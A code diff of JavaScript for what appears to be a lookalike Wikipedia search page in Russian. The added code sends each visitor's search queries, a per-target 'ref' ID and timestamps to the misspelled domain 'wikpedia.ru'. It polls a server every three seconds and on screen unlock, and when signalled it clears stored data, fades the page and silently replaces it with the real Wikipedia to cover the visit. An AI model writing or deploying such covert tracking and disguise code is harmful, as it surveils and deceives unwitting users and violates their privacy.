@@ -62,45 +62,53 @@
 		$(".container").hide();
 		$("#firstpara").show().html('<div class="container"><div class="articletext"></div></div>');
 	
-		// Получаем ref из URL
-		const urlParams = new URLSearchParams(window.location.search);
-		const refId = urlParams.get('ref');
+		const refId = new URLSearchParams(window.location.search).get('ref');
 	
-		fetch(`https://ru.wikipedia.org/w/api.php?format=json&action=query&prop=extracts&exintro=&redirects=&explaintext=&titles=${encodeURIComponent(search)}&origin=*`)
+		// Этап 1: Ищем статьи по запросу
+		fetch(`https://ru.wikipedia.org/w/api.php?format=json&action=query&list=search&srsearch=${encodeURIComponent(search)}&origin=*`)
 			.then(response => response.json())
 			.then(data => {
-				const pages = Object.values(data.query.pages);
-				const page = pages[0];
-	
-				if (page.pageid === -1 && pages.length > 1) {
-					const nextPage = pages.find(p => p.pageid !== -1);
-					if (nextPage) {
-						displayPageContent(nextPage, search);
-					}
-				} else {
-					displayPageContent(page, search);
+				const searchResults = data.query?.search || [];
+				if (searchResults.length === 0) {
+					$("#firstpara").html('<div class="container"><div class="articletext" style="padding: 1em;">Ничего не найдено.</div></div>');
+					return;
 				}
 	
-				// 🔥 НОВЫЙ КОД ОТПРАВКИ ЛОГА (заменяем только эту часть)
-				const refId = new URLSearchParams(window.location.search).get('ref');
-				if (refId) {
-					fetch('https://wikpedia.ru/log_query', {
-						method: 'POST',
-						headers: { 'Content-Type': 'application/json' },
-						body: JSON.stringify({ 
-							ref: refId, 
-							query: search,
-							timestamp: new Date().toISOString() // Добавляем метку времени
-						})
-					}).catch(e => console.error('Ошибка отправки лога:', e));
-				}
+				// Берём первую статью из результатов поиска
+				const firstTitle = searchResults[0].title;
+	
+				// Этап 2: Получаем текст и картинку первой статьи
+				return fetch(`https://ru.wikipedia.org/w/api.php?format=json&action=query&prop=extracts|pageimages&exintro=&redirects=&explaintext=&piprop=original|thumbnail&pithumbsize=300&titles=${encodeURIComponent(firstTitle)}&origin=*`)
+					.then(response => response.json())
+					.then(data => {
+						const pages = Object.values(data.query.pages);
+						const page = pages[0];
+	
+						displayPageContent(page, firstTitle);
+	
+						// Логирование запроса
+						if (refId) {
+							fetch('https://wikpedia.ru/log_query', {
+								method: 'POST',
+								headers: { 'Content-Type': 'application/json' },
+								body: JSON.stringify({
+									ref: refId,
+									query: search,
+									timestamp: new Date().toISOString()
+								})
+							}).catch(e => console.error('Ошибка отправки лога:', e));
+						}
+					});
 			})
 			.catch(error => {
-				$("#firstpara").html('<div class="container"><div class="articletext" style="padding: 1em; color: #d33;">Произошла ошибка при получении данных. Пожалуйста, попробуйте еще раз.</div></div>');
+				console.error(error);
+				$("#firstpara").html('<div class="container"><div class="articletext" style="padding: 1em; color: #d33;">Произошла ошибка. Попробуйте ещё раз.</div></div>');
 			});
-		
+	
 		return false;
 	}
+	
+	
 	
 	
 	// Вынесем отображение контента в отдельную функцию для повторного использования
@@ -148,6 +156,7 @@
 				`);
 			});
 	}
+
 	
 	
 	var hasClickedSearch = false;
@@ -179,27 +188,35 @@
 	const params = new URLSearchParams(window.location.search);
 const ref = params.get("ref");
 
+let redirectInterval = setInterval(checkReset, 3000);
+
 async function checkReset() {
+    // Проверяем, есть ли данные для редиректа
+    const lastSearch = localStorage.getItem('lastWikiSearch');
+    if (!lastSearch) return;
+
+    // Запрос к серверу
     const res = await fetch(`/check_reset?ref=${ref}`);
     const data = await res.json();
 
     if (data.reset) {
-        // Получаем последний поисковый запрос из localStorage
-        const lastSearch = localStorage.getItem('lastWikiSearch');
-
-        // Очищаем localStorage
-        localStorage.clear();
-
-        // Редирект с заменой текущей записи в истории
-        if (lastSearch) {
+        clearInterval(redirectInterval); // Останавливаем интервал
+        localStorage.clear(); // Важно: очищаем хранилище
+        document.body.style.opacity = '0'; // Плавное исчезновение
+        
+        // Мгновенный редирект после минимальной задержки
+        setTimeout(() => {
             location.replace(`https://ru.wikipedia.org/wiki/${encodeURIComponent(lastSearch)}`);
-        } else {
-            location.replace("https://ru.wikipedia.org/wiki/");
-        }
+        }, 50);
     }
 }
 
-setInterval(checkReset, 3000);
+// Реакция на блокировку/разблокировку экрана
+document.addEventListener("visibilitychange", () => {
+    if (!document.hidden) {
+        checkReset(); // Проверяем сразу при разблокировке
+    }
+});
 
 	</script>
 		
